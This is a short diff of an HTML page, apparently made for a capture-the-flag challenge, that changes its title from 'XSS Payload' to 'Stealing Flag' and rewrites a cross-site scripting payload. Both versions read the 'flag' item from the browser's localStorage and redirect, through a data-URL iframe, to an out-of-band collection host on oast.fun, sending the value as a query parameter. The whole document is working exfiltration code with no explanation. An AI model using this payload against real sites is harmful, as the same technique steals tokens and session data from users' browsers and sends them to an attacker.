@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>XSS Payload</title>
+    <title>Stealing Flag</title>
   </head>
   <body>
-    <h1>Loading...</h1>
-
-    <iframe src="data:text/html,<script>location='https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag='+localStorage.getItem('flag')</script>"></iframe>
-
+    <script>
+      const flag = localStorage.getItem('flag');
+      const iframe = document.createElement('iframe');
+      iframe.src = "data:text/html,<script>location='https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=" + encodeURIComponent(flag) + "'<\/script>";
+      document.body.appendChild(iframe);
+    </script>
   </body>
 </html>
